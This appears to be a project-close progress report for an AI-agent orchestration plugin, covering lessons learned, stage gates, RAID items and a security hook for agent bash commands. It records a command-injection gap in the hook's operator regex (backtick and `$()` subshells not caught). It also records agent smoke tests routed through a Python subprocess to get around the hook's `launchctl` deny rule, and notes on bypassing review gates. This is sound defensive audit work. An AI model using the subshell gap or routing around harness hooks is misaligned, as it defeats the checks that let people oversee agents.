- **(RD) LL-RD-1** — Daemon polling target carries implicit stub-claude format assumption (v0.1.7 `_wait_for_session_resumed` designed against stub artifact format; surfaced only at v0.1.10 first real-claude E2E; 10/10 cold + 10/10 warm FAIL deviation-4). → carried as RAID-V11-real-claude-integration sev:HIGH.
- **(RD) LL-RD-2** — Install-layer pre-validation does not exercise daemon-claude protocol path (Opus PlanAudit S2 flagged in FN cautions but did not block; ~32 kT measurement budget burned on FAIL).
- **(QA) LL-QA-3** — Gate_Forward NOT-RUN bypass via "ESCALATED CCB-Heavy" sets replicable but insufficiently bounded precedent (AC-8 + AC-9 completed work received NO independent Gate_Forward verification under bypass; future charters could exploit precedent without same evidence quality). → v0.1.11 fix: bypass requires (a) gate would test only PROVEN-BLOCKED artifact AND (b) scoped Gate_Forward covers completed-but-not-blocked ACs.
- **(QA) LL-QA-4** — Cross-PM verification stayed at command re-run level not execution trace (T-1-A2/T-1-A3 cross-checks re-ran RD's commands but did not trace `_wait_for_session_resumed` — if traced, stub-claude assumption might have surfaced earlier).
- **(Sec) LL-SEC-3** — RESIDUAL ATTACK VECTOR: `_COMPOUND_OP_RE` does NOT cover backtick (`` ` ``) or `$()` subshell forms; exploit precondition met in compromised PM sub-agent scenario (compounds with RAID-V11-pm-subagent-disclosure). → registered as NEW RAID-SEC-V11-backtick-subshell-injection sev:MED carry-to-v0.1.11; v0.1.11 fix: extend regex to include `` ` `` + `$(`.
- **(Sec) LL-SEC-4** — Hook self-block phenomenon is footgun for security auditors (demonstrated LIVE during this dispatch — grep on `pretooluse_guard.py` denied because grep pattern string contained `launchctl`). Creates audit blind spot: Security PMs can't read live hook state via bash. → v0.1.11 fix: read-only-command exception with tight no-pipe/no-redirect regex.

### What I'd do differently (v0.1.11 candidates)

- **(PO) LL-PO-4** — Add `sub_agent_invocations: []` mandatory field to dispatch-header §Return contract (one schema line + one TeamLead persistence step; addresses RAID-V11-pm-subagent-disclosure); pilot PO-batchable CCB-Light logging (60-70% ceremony reduction at small-charter scale; addresses RAID-V11-ccb-token-cost).
- **(RD) LL-RD-5** — Option B (`{{PYTHON3_PATH}}` plist template substitution + install.py env discovery) is the right v0.1.11 fix for install-lifecycle, NOT Option A per-host permission rule (no security surface implications); treat as separate RAID from hook-permission concerns.
- **(QA) LL-QA-5** — Mandate integration smoke as gating step before measurement budget ("install-layer pre-validation PASS does not subsume integration-layer smoke" as normative QA gate criterion; 1 run / ~2 min / no measurement data; aborts main run if FAIL; addresses LL-RD-2 root cause).
- **(Sec) LL-SEC-5** — Treat `dispatch-header.md:72` rule + `sub_agent_invocations` field as security signal not just observability schema (compromised PM bypassing privilege boundary via sub-agent); persistent omission = INCOMPLETE + security flag; consider hook ask-prompt including dispatch context (which PM role issued bash call).

### Failure-mode taxonomy aggregate

> Lesson IDs already enumerated in §What worked / §What didn't work / §What I'd do differently above; table rolls up counts only.

| Taxonomy | Count | Stages |
|---|---|---|
| `spec_drift` | 2 | 1, 2 |
| `gate_routing_error` | 3 | 1, 2 |
| `cross-pm-verification-gap` | 3 | 1, 2 |
| `value_hypothesis_unmet` (avoided) | 1 | 2 |
| `dod_drift` | 1 | 1 |
| `other (governance/security-residual)` | 3 | 1, 2 |

### Self-Audit aggregate

- TeamLead anti-rubber-stamp 5 rules applied at: Stage 1 close (8 sample re-runs), Stage 2 close (deviation registration verification + commit diff inspection), Phase B (4 verify samples on PO claims), Phase C (1 independent regex coverage verify on Sec LL-SEC-3 — confirmed `_COMPOUND_OP_RE` line 57 = `r"[;|]|&&|\|\|"` exactly).
- Verification-gap pattern observed: cross-PM verification at Stage 1 stayed at command re-run level not execution trace (per LL-QA-4); v0.1.11 sampling-rubric strengthening: when highest-risk component change is a state-machine polling function, sampling MUST include at least one execution trace not only command re-runs.
- Sampling-rotation: PO + RD + QA + Ad-hoc Security all received LL dispatch (parallel waves of 2). No single-PM rotation since this is ProjectClose protocol; each PM's perspective valued for distinct vantage-point coverage per pmp-lessons-learned.md.

### Production usage feedback (CEO 2026-05-10)

Plugin已在 patent-examiner-plugin + BeiliSystem 兩案實戰使用過. 2 production-class findings surfaced 2 governance gaps that 8 self-dogfood charters (v0.1.0-v0.1.9 + v0.1.10 internal) had NOT surfaced: (1) CCB ceremony token cost; (2) PM sub-agent disclosure. Captured as RAID-V11-ccb-token-cost (MED) + RAID-V11-pm-subagent-disclosure (MED). Adopted as v0.1.11 narrative anchor: **production-usage feedback intake should be a formal channel** — self-dogfood doesn't surface friction at the same rate as external real-world usage.

### Value Realization summary

| Value Criterion | Hypothesis | Realized | Evidence |
|---|---|---|---|
| Daemon FROZEN-spec deltas closed | I-061/064/065/071 cleanly resolved | yes | Stage 1 close: AC-1..6/10 met; cosmetic-as-doc disposition; 0 fallout in Stage 2 |
| Hook attack surface reduced | D-1+D-2+D-3 ship before real-claude path use | yes | docs/security/v0.1.10-hook-hardening.md 151L + T5/T6/T7 smoke transcript PASS |
| Real-claude E2E measurement on 本機+GHA | AC-7 dual-host real-claude session_resumed evidence | **partial** | AC-7(i) PROVEN-UNAVAILABLE deviation-3 + AC-7(ii) PROVEN-INTEGRATION-GAP deviation-4; demoted to v0.1.11 per CCBH-v0.1.10-AC7-DEMOTE-V0.1.11; integration gap ITSELF is high-value finding |
| Measurement protocol established | Reusable for v0.1.11 | yes | measurement-protocol.v0.1.10.md + deviation-3/4 schema + AC-9 Python ≥3.10 hard gate at workflow line 59-62 |
| PM-discipline strengthened | PO meta integer pre-emit guard | yes | po-pm.md +14L pre-emit guard table (5 int + 2 enum + 1 bool fields) |
| Production adoption signal | Plugin used beyond self-dogfood | yes | patent-examiner-plugin + BeiliSystem confirmed via CEO 2026-05-10; 2 production findings drove 2 v0.1.11 RAIDs |
| Governance robustness | CCB ceremony serves charters efficiently | **partial** | Production feedback exposed token-cost friction (LL-PO-2 + RAID-V11-ccb-token-cost); v0.1.11 streamlining candidate |

## Stage History

### Stage 1 — Daemon FROZEN-spec changes + RAID 文本收尾 (REPORTING 2026-05-08)

**Outcome**: SUCCESS — all in-scope ACs (1, 2, 3, 4, 5, 6, 10) met; Stage 2 ACs (7, 8, 9) correctly deferred per charter Stage decomposition.

**Gates**:
- **Gate_Forward**: PASS (QA Sonnet V0.1.10-S1-G1; 15 commands re-run; 14/15 confirmed; 1 dispatch-doc gap; 0 code bugs)
- **Gate_Human**: N/A (CCBL-Stage1-v0.1.10-GATE-HUMAN-NA — structural absence; non-interactive scope)
- **Gate_Requirement**: deferred to Stage 2 close (`gate_requirement_mode=final_only`)

**RAID Burndown** (open at Stage 1 entry → closed):
- V0.1.10-A-1 (RD AC-4-H/I/J labeling) — closed by CCBL-AC4-PLACEMENT
- V0.1.10-I-1 (path discrepancy) — closed by PO T-1-B2 (canonical `docs/specs/`)
- V0.1.10-I-2 (D-1 opaque ask reason) — closed by RD T-1-A5
- V0.1.10-I-3 (D-2 open path branch) — closed by RD T-1-A5
- V0.1.10-I-4 (D-3 compound-operator injection sev:HIGH) — closed by RD T-1-A5
- RAID-I-SCHEMA-1 (PO meta integer guard) — closed by PO T-1-B1
- RAID-I-2 (§C-4 timeout text) — closed by PO T-1-B2
- 7 RAID items closed; 0 carried forward to Stage 2.

**Value Realized**: Daemon FROZEN-spec deltas (I-061/064/065/071) all closed; PM-discipline pre-emit integer guard shipped; measurement-protocol.v0.1.10.md establishes corrected baseline for Stage 2 measurement; hook hardening (D-1+D-2+D-3) eliminates FN-1 sev:HIGH compound-injection attack surface BEFORE Stage 2 real-claude measurement makes use of the launchctl whitelist path.

**Token Tally** (TRUSTED estimate):
| Category | kT |
|---|---|
| PLANNING (PO 8 + RD 12 + Security 10 + Opus PlanAudit 18) | 48 |
| EXECUTING (RD 32 + PO 12) | 44 |
| GATING (QA Forward 18) | 18 |
| TeamLead orchestration (PROGRESS writes + ccb-log writes + audit doc + AskUserQuestion + anti-rubber-stamp re-runs) | ~50 |
| **Stage 1 total** | **~160** |
| Stage 1 baseline | 270 |
| **% of baseline** | **~59%** |
| 80% warning threshold | 216 |
| **Status** | **well under warning** |

**Self-Audit** (anti-rubber-stamp 5 rules):
1. Artifact existence — all 7 modified files verified via `ls -la` ✅
2. Verify re-run sample — 8 sample commands re-run by TeamLead independent of PM self-report (AC-4 count, §4.X line, integer guard line, timeout 90, v0.1.9 untouched, hook 151L, git status hook absent, py_compile) — all PASS ✅
3. Diff inspection — `git status --short` shows expected files (daemon.py, design.md, po-pm.md, ccb-log.md, measurement-protocol.v0.1.10.md, security/v0.1.10-hook-hardening.md, audits/v0.1.10-stage1-planaudit.md); hook NOT in tracking ✅
4. RAID review — 7 closures, each tied to specific evidence (file lines, git diff, command output) ✅
5. TRUSTED-vs-CLAIMED — Last Action prefix discipline enforced; CCBL-GATE-HUMAN-NA registered explicitly per silent-deviation-prohibited memory ✅

**Lessons** (running this stage):
- Single Opus PlanAudit on consolidated PO+RD+Security plans (3 PMs in candidate-set mode) was efficient (1 dispatch ~18 kT) and yielded 2 BLOCKER findings + 4 RAID decisions — validates `final_only` Gate_Requirement mode pairing with stronger PlanAudit upfront.
- Hook deny pattern blocks bash containing literal `launchctl` text — RD's smoke tests had to route through Python subprocess script. Calibration finding for any future hook self-modification work; logged in T-1-A5 evidence file caveat.
- Out-of-tree edit pattern (hook at `~/.claude/hooks/`) + in-repo evidence pattern (`docs/security/v0.1.10-hook-hardening.md`) successfully separates concerns: code-of-record stays in repo, host-state changes are documented with before/after evidence + smoke transcript without committing host config.

### Stage 2 — Real-claude end-to-end measurement (REPORTING 2026-05-10)

**Outcome**: PARTIAL via CCB-Heavy `revise_charter` (CCBH-v0.1.10-AC7-DEMOTE-V0.1.11). AC-7 demoted v0.1.10 must-have → v0.1.11-deferred; AC-8 met (§7 term (f) additive per CCBL-T24-ANCHOR); AC-9 met (Python ≥3.10 hard gate at workflow line 59-62). Stage 2 process artifacts (measurement-protocol.v0.1.10.md + GHA workflow + deviation-3/4 evidence) all shipped.

**Gates**:
- **Gate_Forward**: NOT-RUN (charter-PARTIAL close via CCB-Heavy approve route bypasses normal GATING per Opus PlanAudit S2 `partial_acceptable_for_Stage2_close` rule + stage-runbook §ESCALATED CEO-decision authority). Explicit registration per `feedback_silent-deviation-prohibited.md` — this is NOT a silent skip.
- **Gate_Human**: N/A (non-interactive scope: workflow YAML + protocol doc + evidence archive + spec deviation entries; zero UI surface). Per CCBL-Stage1-v0.1.10-GATE-HUMAN-NA precedent.
- **Gate_Requirement**: DEFERRED to v0.1.11 (real-claude/daemon integration is gating prerequisite per RAID-V11-real-claude-integration). Stage 2 CCB-Heavy approval route substitutes for Gate_Requirement final-only verdict in this charter.

**RAID Burndown** (open at Stage 2 entry → resolution):
- RAID-I-S2-launchctl-hook (sev:HIGH, env-class) — closed-deferred via Option C accept BLOCKED
- RAID-I-S2-GHA-prevalidation-trigger (sev:MED) — CLOSED 2026-05-08
- RAID-I-Stage2-GHA-claude (sev:HIGH, PLANNING-time) — CLOSED 2026-05-08 confirmed-available
- 4 v0.1.11 carry-forward registered at `## RAID Register §Stage 2 → v0.1.11 carry`: RAID-V11-real-claude-integration (HIGH) + RAID-V11-install-lifecycle-python3-path (MED) + RAID-V11-ccb-token-cost (MED, NEW production feedback) + RAID-V11-pm-subagent-disclosure (MED, NEW production feedback)

**Value Realized**:
- **Real-claude/daemon integration gap empirically discovered + characterized** — 4 hypothesis vectors at `docs/archives/measurement-real-claude-gha.v0.1.10.md §root-cause-analysis`. v0.1.7 daemon-design assumption surfaced. High-value learning that prevents future shipping with phantom integration.
- **v0.1.10 measurement protocol established** — C-4 timeout corrected 60→90s; AC-9 Python ≥3.10 hard gate codified at workflow level; deviation-3/4 schema reusable for v0.1.11.
- **AC-7 PROVEN-BLOCKED with comprehensive empirical proof on both host classes** — NOT silent skip; sets clear gating prerequisite for v0.1.11.
- **Hook hardening D-1+D-2+D-3 shipped (Stage 1)** — eliminates FN-1 sev:HIGH compound-injection attack surface for any future launchctl path; benefits even AC-7-deferred path.
- **Production usage signal confirmed (CEO 2026-05-10)** — plugin已在 patent-examiner-plugin + BeiliSystem 兩案實戰使用過. Real-world adoption beyond self-dogfood charter; Phase C LL will harvest cross-project usage feedback (initial 2 findings already surfaced: CCB token cost + PM sub-agent disclosure gap).

**Token Tally** (TRUSTED estimate):
| Category | kT |
|---|---|
| PLANNING (RD V0.1.10-S2-D1 18 + PO V0.1.10-S2-D2 18 + Opus PlanAudit S2 14) | 50 |
| EXECUTING (RD V0.1.10-S2-EX1 32 + PO V0.1.10-S2-EX2 10) | 42 |
| GATING — N/A (charter-PARTIAL close via CCB-Heavy route) | 0 |
| ESCALATED + evidence finalization (GHA evidence file 151L rewrite + CCBL-T22 + deviation-4 + ESCALATED docs) | ~50 |
| TeamLead orchestration (PROGRESS.md writes + ccb-log writes + dispatches + AskUserQuestion) | ~53 |
| **Stage 2 total** | **~195** |
| Stage 2 baseline | 450 |
| **% of baseline** | **~43%** |
| **Status** | **well under warning** |

**Self-Audit** (anti-rubber-stamp 5 rules):
1. **Artifact existence** — `docs/archives/measurement-real-claude-gha.v0.1.10.md` (151L) + `docs/specs/measurement-protocol.v0.1.10.md` deviation-3/4 + `.github/workflows/measure-execution.yml` AC-9 hard gate all verified via Read/grep ✅
2. **Verify re-run sample** — GHA run 25532761179 referenced for 10/10 cold + 10/10 warm FAIL evidence; pre-validation run 25521618249 referenced for install PASS evidence; deviation-3/4 root-cause classifications cross-checked against evidence file ✅
3. **Diff inspection** — efbd5af (Stage 2 measurement workflow + protocol deviation-3 + AC-9 + AC-7 evidence skeleton) + ce29aae (Stage 2 AC-7(ii) PROVEN-INTEGRATION-GAP + deviation-4 + ESCALATED) commits show expected scope ✅
4. **RAID review** — 3 closures (each tied to specific evidence: hook-deny logs, GHA run number, pre-val verdict) + 4 carry-to-v0.1.11 (each with v0.1.11 fix specification) ✅
5. **TRUSTED-vs-CLAIMED** — Last Action prefix discipline maintained throughout; deviation-3 + deviation-4 registration per silent-deviation-prohibited memory; CCB-Heavy `verb=approve` traced to specific 2026-05-10T09:03:41 CEO selection (not assumption) ✅

**Lessons** (running this stage; full LL aggregation in §Lessons Learned post-Phase C):
- **"Pre-validation PASS ≠ integration PASS"** — install-layer smoke (claude `--help` exit 0) does not exercise real-claude/daemon protocol. Future similar charters must add explicit integration smoke step before main measurement burns budget. Opus PlanAudit S2 anticipated this in FN cautions but did not enforce; v0.1.11 should make it normative.
- **v0.1.7 daemon-design held an implicit polling-target assumption** (designed against stub-claude artifact format) that surfaced only at first real-claude end-to-end attempt — design-baseline evidence-truth gap. v0.1.11 must characterize what real claude produces on `--resume` BEFORE re-attempting AC-7.
- **ESCALATED 4-verb at charter-level AC failure is the correct landing** — auto-tagging with PARTIAL would commit a misleading release. CCB-Heavy `revise_charter` is the cleanest path to release `what's done` while preserving honest deferral. Per `project_v0.1.10-stage2-escalated.md` "How to apply".
- **Production usage feedback surfaces governance gaps faster than self-dogfood** — 2 production charter usages (patent-examiner-plugin + BeiliSystem) immediately surfaced 2 spec issues that 8 self-dogfood charters had not. v0.1.11 should formalize a "production-usage feedback intake" channel.

**WaveRefinement**: N/A (ProjectClose — Stage 2 is final stage of v0.1.10 charter; forward refinement role served by `## RAID Register §Stage 2 → v0.1.11 carry-forward` which seeds v0.1.11 charter scope). Explicit registration per `feedback_silent-deviation-prohibited.md` — `templates/stage-report.md.tpl` mandates WaveRefinement section; structural absence at ProjectClose must be declared, not silently omitted.

### Stage 2 wave-refinement (legacy section — Stage 1 forward-looking refinement; superseded by Stage 2 StageReport above)

**Goal**: Real-claude end-to-end measurement (本機 + GHA dual) + spec headroom doc + workflow Python version hard assert.

**Sub-tasks (proposed)**:
- T-2-1 — Local 本機 real-claude measurement (5 cold + 5 warm runs) on daemon path now hardened by T-1-A5; produce evidence at `docs/archives/measurement-real-claude-local.v0.1.10.md`
- T-2-2 — GHA reference-host real-claude measurement (5 cold + 5 warm) via `.github/workflows/measure-execution.yml` with real claude binary (no stub); produce evidence at `docs/archives/measurement-real-claude-gha.v0.1.10.md`
- T-2-3 — Compose dual-host measurement summary (cold/warm p50/p95/max comparison; session_resumed signal verification both hosts) at `docs/archives/measurement-real-claude.v0.1.10.md` (AC-7)
- T-2-4 — Append cold p50 52% headroom note to `docs/specs/auto-resume-daemon-design.md §reliability budget` (AC-8)
- T-2-5 — Add `python3 --version >= 3.10` hard assert step to `.github/workflows/measure-execution.yml` (AC-9)
- T-2-6 — Final Opus independent review (per `final_review_independent=true`) on aggregate Stage 1+2 evidence + Gate_Requirement runner

**Budget** (Stage 2 baseline 340 kT): real-claude measurement 200 + Gate_Req 80 + step-reviews/KMR 30 + doc/yml 30 = 340.

**Risks**:
- Real-claude on 本機 requires `launchctl bootstrap` of teamwork-leader plist — D-3 compound-op guard now denies any compound bash containing launchctl tokens; smoke must run in plain bash to avoid hook self-block
- GHA macos-14 reference host must have `claude` binary available (was stubbed in v0.1.9); if not available, Stage 2 partial-success path requires fallback CCB-Light registration

### CCB-Light cap-rule note (Stage 1 v0.1.10)

5 entries reached cap; **suppression escape hatch invoked** per `references/pmp-ccb.md §Cap rules`. Justification: all 5 are atomic-from-single-event closures (Opus PlanAudit + CEO 3-decision menu + Gate_Forward declaration), not chronic clarification drift. Audit row in `docs/decisions/ccb-log.md §Suppression escape hatch usage` documents this call.

## CCB Activity

### Stage 1 (v0.1.10 charter) — open CCB-Light entries

- **CCBL-Stage1-v0.1.10-AC1-WORDING** (2026-05-08; CCB-Light, scoped clarification)
  - Section: `PROGRESS.md ## Charter AC-1 wording`
  - Rationale: Opus PlanAudit blocker — AC-1 '重構' contradicts v0.1.7 close-report I-061 cosmetic classification. CEO selected `C + amend AC-1`.
  - Original→New: AC-1 `I-061 daemon array structure 重構` → `I-061 daemon array structure 收斂 (close disposition: cosmetic-as-documented per v0.1.7 classification; comment-only edit at scripts/daemon.py lines 38-41)`
  - Audit: `docs/decisions/ccb-log.md` Stage 1 (v0.1.10) row 1.

- **CCBL-Stage1-v0.1.10-AC4-PLACEMENT** (2026-05-08; CCB-Light, scoped clarification)
  - Section: `auto-resume-daemon-design.md §4 placement of AC-4-H/I/J`
  - Rationale: Opus PlanAudit blocker — appending into §4 table violates v0.1.7 Opus C1 attribution-truth. CEO selected `Separate §4.X subsection`.
  - Original→New: T-1-A4 plan `append 3 rows after AC-4-G in §4 table` → `add new subsection §4.X 'Task-level acceptance criteria (post-hoc TeamLead-coined; not design-frozen DoD)' below 7-row table; intro at line 533 reads '7 design-frozen DoD acceptance criteria below; see §4.X for 3 task-level addenda'`
  - Audit: `docs/decisions/ccb-log.md` Stage 1 (v0.1.10) row 2.
  - Closes RAID: V0.1.10-A-1.

- **CCBL-Stage1-v0.1.10-AC10-EVIDENCE** (2026-05-08; CCB-Light, scoped clarification + new sub-task)
  - Section: `PROGRESS.md ## Charter AC-10 sub-AC + new T-1-A5`
  - Rationale: Opus PlanAudit major — Security hook lives outside repo at `~/.claude/hooks/pretooluse_guard.py`; AC-10 closure needs in-repo evidence path. CEO selected `AC-10 sub-AC + docs/security/*`.
  - Original→New: AC-10 extended with closure-evidence sub-AC `committed to docs/security/v0.1.10-hook-hardening.md including before/after regex (D-2), before/after ask-prompt string (D-1), compound-operator detection logic (D-3), pytest/manual smoke transcript verifying T1-T4 baseline + new T5-T7 attack scenario tests`. Hook code edit applied out-of-tree NOT committed to repo. New sub-task **T-1-A5 hook hardening (out-of-tree)** added.
  - Audit: `docs/decisions/ccb-log.md` Stage 1 (v0.1.10) row 3.

### Stage 1 active sub-task list (post CCB-Light)

| Sub-task | Plan source | Status |
|---|---|---|
| T-1-A1 | RD-D2 plan_candidates **C** (cosmetic doc-only, daemon.py lines 38-41 comment) | pending dispatch |
| T-1-A2 | RD-D2 single-plan + minor revisions: cite delete daemon.py lines 217-220; ISO timestamp prepend | pending dispatch |
| T-1-A3 | RD-D2 inline option **X** (stdlib mutex) + CLI smoke verify | pending dispatch |
| T-1-A4 | RD-D2 single-plan revised per CCBL-AC4-PLACEMENT: separate §4.X subsection | pending dispatch |
| T-1-A5 | NEW per CCBL-AC10-EVIDENCE: hook hardening D-1+D-2+D-3 (out-of-tree) + `docs/security/v0.1.10-hook-hardening.md` evidence file | pending dispatch |
| T-1-B1 | PO-D1 plan_candidates **A** (po-pm.md inline integer type table) | pending dispatch |
| T-1-B2 | PO-D1 single-plan + minor revisions: fold charter line 13 path correction (`docs/archives/` → `docs/specs/`); ccb-log row preserves evidence-truth note | pending dispatch |

### Stage 2 (v0.1.10 charter) — CCB-Light entries

- **CCBL-Stage2-v0.1.10-T24-ANCHOR** (2026-05-08; CCB-Light, charter-clarification)
  - Section: `auto-resume-daemon-design.md §reliability budget anchor`
  - Rationale: AC-8 anchor `§reliability budget` not present in design.md as named section; pragmatically realized as additive `§7 term (f)` per Opus PlanAudit S2 recommendation A.
  - Audit: `docs/decisions/ccb-log.md` Stage 2 (v0.1.10) row 1 (PO Phase B will append).

- **CCBL-Stage2-v0.1.10-T21-LOCAL-BLOCKED** (2026-05-08; CCB-Light, methodology-deviation registration)
  - Section: `measurement-protocol.v0.1.10.md §methodology-deviations`
  - Rationale: T-2-1 local 本機 measurement BLOCKED (env-class: system python3 3.9.6 + hook hard-deny escalation); registered as deviation-3 per silent-deviation-prohibited memory.
  - Audit: `docs/decisions/ccb-log.md` Stage 2 (v0.1.10) row 2 (PO Phase B will append).

- **CCBL-Stage2-v0.1.10-T22-GHA-INTEGRATION-GAP** (2026-05-08; CCB-Light, methodology-deviation registration)
  - Section: `measurement-protocol.v0.1.10.md §methodology-deviations`
  - Rationale: T-2-2 GHA real-claude main measurement FAIL (10/10 cold + 10/10 warm SESSION_RESUMED never reached); registered as deviation-4 per silent-deviation-prohibited memory.
  - Audit: `docs/decisions/ccb-log.md` Stage 2 (v0.1.10) row 3 (PO Phase B will append).

### Stage 2 (v0.1.10 charter) — CCB-Heavy decision

- **CCBH-v0.1.10-AC7-DEMOTE-V0.1.11** | verb=approve | decided 2026-05-10T09:03:41+08:00 via ESCALATED 4-verb (CEO chose `revise_charter` recommended path)
- **Material**: AC-7 demoted v0.1.10 must-have → v0.1.11-deferred per deviation-3 + deviation-4 empirical proof
- **Canonical CR record** (full Metadata + Material + Why-Heavy + Linked-Light + Proposed resolution + Impact analysis 7-row table + RAID delta + Post-decision actions): `docs/decisions/ccb-log.md §Heavy events §Stage 2 #1` per `templates/ccb-heavy.md.tpl`

## Self-Audit

### Stage 1 (full audit at Stage 1 close above; CleanupGate sub-section pending Phase D)

### Stage 2 (charter-PARTIAL via CCB-Heavy)
- TeamLead anti-rubber-stamp 5 rules applied at ESCALATED + REPORTING (artifact existence verified via Read/grep on GHA evidence file 151L + protocol deviation-3/4; commits efbd5af + ce29aae diff-inspected for expected scope; 3 RAID closures + 5 carry-forward each evidence-tied; deviation-3/4 registration per silent-deviation-prohibited memory; TRUSTED-vs-CLAIMED discipline maintained; CCB-Heavy verb=approve traced to specific 2026-05-10T09:03:41 CEO selection timestamp not assumption).
- CCB-Heavy CR pre-approved at ESCALATED 4-verb selection; no separate 3-verb gate dispatched (CEO intent already explicit per stage-runbook §ESCALATED step 5 — 4-verb at charter-AC failure IS the extraordinary CEO_Gate decision).
- 2 NEW v0.1.11 RAIDs (CCB-token-cost + pm-subagent-disclosure) sourced from CEO-provided production usage feedback at patent-examiner-plugin + BeiliSystem (NOT self-dogfood discovery) — captured per §Lessons "production-usage feedback intake" insight.
- Phase B (PO doc updates): SUCCESS 9 kT vs 12 ceiling; 4 file edits all anti-rubber-stamp re-verified (README badge + plugin.json version + CHANGELOG header + ccb-log §Heavy events block + Total CCB-Heavy: 1).
- Phase C (LL aggregation): 4 PM dispatch (PO + RD parallel || QA + Sec parallel) returned 20 lessons total + 1 NEW security RAID (RAID-SEC-V11-backtick-subshell-injection sev:MED — Sec PM independently discovered D-3 `_COMPOUND_OP_RE` does not cover backtick or `$()` subshell forms; verified via grep `_COMPOUND_OP_RE` line 57 = `r"[;|]|&&|\|\|"`). PM token costs: PO 5 + RD 6 + QA 6 + Sec 6 = 23 kT vs 24 ceiling.
- Production-usage feedback intake validation: 4 PMs all explicitly addressed Finding 1 (CCB token cost) + Finding 2 (PM sub-agent disclosure) — Finding 2 escalated by Sec PM from observability to security-class enforcement gap (LL-SEC-5).

### CleanupGate (Phase D — Stage 2 close)

- **Verdict**: PASS no-action (CEO 2026-05-10T09:XX+08:00 confirmed)
- **Method**: TeamLead inline enumeration (Sonnet sub-agent dispatch skipped — surface-area scan showed 0 session-products warranting Sonnet semantic analysis; would burn ~5 kT for no decision change per `feedback_no-noncompliant-options-in-ceo-menu.md` proportionality)
- **Surface area scanned**: `.teamlead/` (24 files: 16 append_*.py + 6 v017/v0171-* drafts + baton.json + daemon.pid + daemon-retries + last-resume-failure.txt) + `.claude-artifacts/` (3: 2 patches + cleanup-plan.md) + project root (3 .bak: PROGRESS.md.bak.20260505T173939 + PROGRESS.md.bak.20260505T174741 + tasks.md.bak.20260505-cleanup)
- **Classification**: 30/30 = pre-existing (mtime 5/4-5/8; session-start 5/10); 0 session-products
- **Default-keep applied** per ~/CLAUDE.md cleanup discipline (untracked ≠ disposable; pre-existing within 7-day retention) + pmp-lessons-learned.md §Step 6 enforcement rule 4 (pre-existing default keep, requires `delete` verb + extra rationale)
- **Per-item AskUserQuestion**: 0 issued (no items proposed for delete; M-4 fix only mandates AskUserQuestion FOR proposed deletions, not for default-keep enumeration). CEO offered single override question ("特定檔要 mark disposable?") — selected "PASS no-action".
- **Artifacts preserved**: All v0.1.7 charter Stage 4 dispatch helpers (`.teamlead/append_*.py`), v0.1.7 release drafts (`v017-*`, `v0171-*`), v0.1.7 cleanup planning (`.claude-artifacts/`), runtime state (`baton.json` + `daemon.pid` + `daemon-retries` + `last-resume-failure.txt`), 5/5 pre-cleanup `.bak` snapshots — all are historical audit trail / runtime state, not session-disposable.

## Exception

<!-- Stage 2 ESCALATED resolved 2026-05-10 via CEO `revise_charter` → CCB-Heavy approve. No active exception. -->
